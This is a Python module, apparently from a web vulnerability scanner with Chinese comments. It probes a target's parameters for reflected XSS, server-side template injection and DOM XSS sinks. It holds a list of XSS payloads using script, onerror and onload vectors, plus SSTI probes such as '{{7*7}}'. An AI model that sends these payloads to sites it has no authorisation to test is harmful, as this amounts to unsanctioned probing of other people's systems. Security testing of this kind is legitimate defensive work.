"""
XSS 检测模块（反射型 / SSTI / DOM 分析）
Author: 火柴 | GitHub: huocai250
v4.0: 测试真实注入点 + 并发；使用唯一标记降低误报
"""
import re
from core.scanner import BaseScanner
from core.colors import log
from utils.http import build_url

# 用唯一标记包裹，避免把页面里本就存在的 alert(1) 误判
MARK = "xss8931"

REFLECTED_PAYLOADS = [
    f'<script>alert("{MARK}")</script>',
    f'"><script>alert("{MARK}")</script>',
    f"'><script>alert(\"{MARK}\")</script>",
    f'<img src=x onerror=alert("{MARK}")>',
    f'"><svg/onload=alert("{MARK}")>',
    f'<details open ontoggle=alert("{MARK}")>',
]

SSTI_PAYLOADS = {
    "{{7*7}}":    "49",       # Jinja2 / Twig
    "${7*7}":     "49",       # FreeMarker / Thymeleaf
    "#{7*7}":     "49",       # Ruby ERB / Slim
    "<%= 7*7 %>": "49",       # EJS / ERB
    "{{7*'7'}}":  "7777777",  # Jinja2
}

DOM_INDICATORS = [
    "document.write", "innerHTML", "outerHTML",
    "eval(", "setTimeout(", "setInterval(",
    "document.location", "window.location",
    "document.URL", "document.documentURI",
]

COMMON_PARAMS = ["q", "search", "keyword", "name", "input", "value",
                 "message", "comment", "text", "query", "s", "term",
                 "title", "content", "desc", "description", "msg"]


class XSSScanner(BaseScanner):
    name = "xss"

    def run(self):
        log("INFO", "XSS 检测（反射型 / SSTI / DOM，并发）...")
        base = self.baseline()
        if base:
            self._check_dom(base.text)

        targets = self.injection_targets(COMMON_PARAMS)
        if not targets:
            log("SKIP", "无可测试参数")
            return
        log("INFO", f"共 {len(targets)} 个参数点待测")
        self.map(self._test_param, targets)

    def _req(self, method, url, params):
        if method == "POST":
            return self.post(url, data=params)
        return self.get(build_url(url, params))

    def _test_param(self, target):
        url, method, params, pname = target
        # 反射型
        for payload in REFLECTED_PAYLOADS:
            test = dict(params); test[pname] = payload
            r = self._req(method, url, test)
            if r and payload in r.text and not self._is_encoded(payload, r.text):
                log("VULN", f"[反射型XSS] 参数: {pname} | {payload[:40]}")
                self.add("XSS", "HIGH",
                         f"[反射型XSS] 参数 '{pname}' 未过滤直接输出",
                         f"Payload: {payload} @ {url}", url=url)
                break
        # SSTI
        for payload, expected in SSTI_PAYLOADS.items():
            test = dict(params); test[pname] = payload
            r = self._req(method, url, test)
            if r and expected in r.text and payload not in r.text:
                log("VULN", f"[SSTI] 参数: {pname} | {payload}→{expected}")
                self.add("SSTI", "CRITICAL",
                         f"[模板注入] 参数 '{pname}' 存在服务端模板注入",
                         f"Payload: {payload} 输出: {expected} @ {url}", url=url)
                return f"ssti:{pname}@{url}"
        return None

    def _check_dom(self, html):
        found = [i for i in DOM_INDICATORS if i in html]
        if len(found) >= 2:
            log("WARN", f"页面存在 DOM XSS 风险点: {', '.join(found[:4])}")
            self.add("XSS", "LOW",
                     f"页面存在可能的 DOM XSS 风险: {', '.join(found[:4])}",
                     url=self.target, confidence="疑似")

    def _is_encoded(self, payload, text):
        encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
        return encoded in text and payload not in text
